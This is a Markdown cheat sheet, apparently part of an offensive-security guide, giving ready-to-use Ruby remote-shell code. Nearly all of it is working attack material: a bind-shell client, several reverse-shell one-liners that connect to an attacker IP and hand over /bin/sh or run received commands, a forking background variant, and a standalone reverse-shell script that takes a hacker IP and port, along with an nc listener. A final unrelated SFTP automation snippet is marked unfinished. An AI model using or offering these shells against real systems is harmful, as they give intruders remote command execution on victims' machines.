# Remote Shell

> **Note:** For windows systems, replace the "/bin/sh" to "cmd.exe"

## Connect to Bind shell
from terminal
```ruby
ruby -rsocket -e's=TCPSocket.new("VictimIP",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'
```
since `192.168.0.15` is the victim IP

## Reverse shell
Attacker is listening on port 4444 `nc -lvp 4444`. Now on victim machine run
```ruby
ruby -rsocket -e's=TCPSocket.open("192.168.0.13",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

if you don't whant to rely on `/bin/sh`
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

if you don't whant to rely on `cmd.exe`
```ruby
ruby -rsocket -e 'c=TCPSocket.new("192.168.0.13","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

since `192.168.0.13` is the attacker IP

If you what it as more flixable script file

```ruby
#!/usr/bin/env ruby
require 'socket'
if ARGV[0].nil? || ARGV[1].nil?
    puts "ruby #{__FILE__}.rb [HACKER_IP HACKER_PORT]\n\n"
    exit
end
ip, port = ARGV
s = TCPSocket.open(ip,port).to_i
exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
```
- To listen 
```
ruby ncat.rb -lvp 443 
```

- To connect 
```
ruby ncat.rb -cv -r RHOST -p 443
```

## Bind and Reverse shell 
This is an awesome implementation for a standalone  [bind][1] and [reverse][2] shells scripts written by [Hood3dRob1n][3] on github . The bind shell requires authentication while reverse is not.




## Pseudo Terminal (PTY)
To be fixed
```ruby
# https://gist.github.com/kwent/e2c34c2dfd01a194a49a
# http://ruby-doc.org/stdlib-2.2.0/libdoc/pty/rdoc/PTY.html

require 'pty'
require 'expect'
PTY.spawn('sftp username@sftp.domain.com:/uploads') do |input, output|
  # Say yes to SSH fingerprint
  input.expect(/fingerprint/, 2) do |r|
    output.puts "yes" if !r.nil?
    # Enter SFTP password
    input.expect(/password/, 2) do |r|
      output.puts 'your_sftp_password' if !r.nil?
      input.expect(/sftp/) do
        # List folders and files in `/uploads`
        output.puts 'ls'
        # Check if folder named `foo` exist
        input.expect(/foo/, 1) do |result|
          is_folder_exist = result.nil? ? false : true
          # Create `foo` folder if does'nt exist
          output.puts "mkdir foo" if !is_folder_exist
          # Change directory to `foo`
          output.puts "cd foo"
          # Upload `/path/to/local/foo.txt` in `foo` folder as `foo.txt`
          output.puts "put /path/to/local/foo.txt foo.txt"
          # Exit SFTP
          output.puts "exit"
        end
      end
    end
  end
end
```



<br><br><br>
---
[1]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/bind.rb
[2]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/rubyrev.rb
[3]: https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells